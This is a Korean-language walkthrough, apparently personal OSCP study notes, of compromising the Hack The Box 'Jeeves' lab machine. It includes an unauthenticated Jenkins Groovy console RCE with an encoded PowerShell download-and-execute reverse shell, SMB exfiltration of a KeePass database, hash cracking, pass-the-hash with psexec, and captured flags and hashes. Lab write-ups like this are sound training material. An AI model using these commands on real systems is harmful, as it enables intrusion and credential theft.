---
slug: "jeeves"
title: "Jeeves"
date: 2026-07-15
category: "윈도우"
section: "OSCP"
tags: []
excerpt: "50000에 고버스터 풀 문자열 때리니까 ```sh gobuster dir -u http://10.129.228.112:50000/ -w…"
readingTime: 8
---

#### Box: Jeeves | Windows | Medium
날짜: 2026 07 15
소요시간: 

##### Open Ports
80
135
445 SMB
50000

##### Interesting Services
80에 뭘 검색하든 에러가 뜸 
Ask Jeeves라는 옛날에 서비스를 종료한 사이트인듯 함

50000에 고버스터 풀 문자열 때리니까 
```sh
gobuster dir -u http://10.129.228.112:50000/ -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt

askjeeves            (Status: 302) [Size: 0] [--> http://10.129.228.112:50000/askjeeves/]
```
하나 나옴

##### Initial Foothold
벡터: Jenkins 미인증 Script Console RCE
명령어:
`/Jenkins`라는 곳에 들어가보면 여긴 신기하게도 CVE는 없음
하지만 
`Jenkins script console unauthenticated RCE`
[hacktricks jenkins](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script.html)

이렇게 검색하면 /script에 어떤 식으로 하면 RCE가 실행되는지에 대한 정보가 나옴
```sh
#kali에서 
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
echo "Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port 443" >> Invoke-PowerShellTcp.ps1

scriptblock="IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28:8000/Invoke-PowerShellTcp.ps1')"

echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
#이렇게 나온 해시가 아래임 SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA4ADoAOAAwADAAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQAKAA==

python3 -m http.server 8000
nc -lnvp 443
```

그리고 스크립트에선 이렇게 실행하게 함
```groovy
"PowerShell.exe -Exec ByPass -Nol -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA4ADoAOAAwADAAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQAKAA==".execute()
```
![](assets/images/posts/Pasted%20image%2020260715174532.png)
-> 이러면 다운로드와 동시에 파일을 실행함
**user.txt :** e3232272596fb47950d59c4cf1e7066a

##### Privilege Escalation
벡터: KeePass DB 크랙 → NTLM 해시 획득 → psexec로 SYSTEM
명령어:
```
PS C:\Users\kohsuke\Documents> dir

# CEH.kdbx
```
-> 여기에 이상한 확장자를 가진 파일이 있음
KeePass 데이터베이스 라고 함

이 파일을 Kali로 빼오기 위해 SMB를 이용함
```sh
#칼리에서
impacket-smbserver Share $(pwd) -smb2support

#윈도우에서
copy CEH.kdbx \\10.10.14.28\Share\
```
하면 해당 파일을 빼올 수 있음

그래서 
https://exploitnotes.org/exploit/cryptography/algorithm/kdbx-files
아래 사이트에서 나온 정보대로 따라해봤음 
```sh
sudo apt install keepass2

#비밀번호가 걸려있어서 keepass2john으로 master 해시값 가져옴
keepass2john CEH.kdbx > cred.hash

# 앞에 CEH:를 지워줘야 hashcat 사용 가능 CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48

hashcat -m 13400 ./crack.hash /usr/share/wordlists/rockyou.txt 
```
![](assets/images/posts/Pasted%20image%2020260715180209.png)

이제 keepass2로 들어가서 해당 크레덴셜로 파일을 열어줌
![](assets/images/posts/Pasted%20image%2020260715180322.png)
![](assets/images/posts/Pasted%20image%2020260715180348.png)
-> 가장 아래 있는 녀석의 비밀번호가 아래와 같은데aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

ssh가 안열려 있지만 SMB가 열려 있으니 이를 적극 활용하면됨
```sh
impacket-psexec administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```
-> 권한 상승 성공!

근데 이 박스가 날 화나게 하는게 여기까지 했으면 플래그를 그냥 주면 좋겠지만 순순히 내놓질 않음
![](assets/images/posts/Pasted%20image%2020260715180745.png)

저게 ADS 라는 개념인데 
**NTFS ADS의 "스트림"**  
파일 안에 붙어있는 독립된 데이터 덩어리. `hm.txt:root.txt`처럼 하나의 파일이 여러 개의 데이터 창고(스트림)를 가질 수 있음.
```cmd
dir /A /R
```
![](assets/images/posts/Pasted%20image%2020260715181558.png)
-> 이런 식으로 하면 모든 안보이는 파일을 다 볼 수 있음
읽을땐

```cmd
more < hm.txt:root.txt:$DATA

```
**root.txt :** afbc5bd4b615a60648cec41c6ac92530


##### Rabbit Hole (막혔던 것)

##### 다음 박스에서 써먹을 것
- cve 안나온다고 답답해하지말고 RCE나 LFI 추가해서 한번 검색해보기
- 스크립트 실행 또는 파일 업로드 있을 때 CVE가 아니여도 설정 문제로 취약하게 됐을 수도 있음! 열린 페이지 세밀하게 확인해보기
- 꼭 Desktop 디렉토리 아니여도 다른 디렉토리들도 열어보기
- SMB 이용해 윈도우에 있는 파일 kali로 빼오기
- ssh 닫혀있다면 SMB 이용해서 used credential로 로그인하기